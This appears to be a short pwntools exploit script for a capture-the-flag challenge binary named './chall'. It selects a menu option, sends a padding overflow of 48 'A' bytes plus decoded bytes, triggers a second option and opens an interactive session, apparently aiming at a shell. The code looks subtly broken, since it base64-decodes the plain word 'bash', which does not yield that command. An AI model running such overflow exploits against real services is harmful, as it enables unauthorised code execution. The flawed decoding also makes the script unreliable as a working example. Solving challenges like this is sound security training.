#!/usr/bin/python3
from pwn import *
import base64

context.log_level = 'debug'

target_command = 'bash'
raw_bytes = base64.b64decode(target_command)
print(f"{raw_bytes=}")

p = process('./chall')
# p = remote('IP', PORT)

p.sendlineafter(b'> ', b'1')

payload = b'A' * 48 + raw_bytes
print(f"{payload=}")

p.send(payload)

p.sendlineafter(b'> ', b'2')

p.interactive()